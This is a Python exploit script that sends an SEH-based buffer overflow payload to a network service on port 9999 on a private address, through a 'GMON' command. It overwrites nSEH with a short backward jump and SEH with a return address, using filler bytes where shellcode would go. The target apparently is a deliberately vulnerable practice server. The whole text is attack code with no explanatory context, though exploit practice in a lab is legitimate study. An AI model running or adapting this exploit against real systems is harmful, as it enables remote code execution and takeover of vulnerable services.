import socket, sys

nseh=b""
nseh=b"\xeb\xb6"
nseh+=b"\x90\x90"

seh=b"\xb4\x10\x50\x62"

payload=b""
payload+=b"B"*(3549-70)
payload+=b"A"*(3549-len(payload))
payload+=nseh
payload+=seh
payload+=b"D"*(5000-len(payload))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GMON /."+payload))
s.close()
sys.exit()
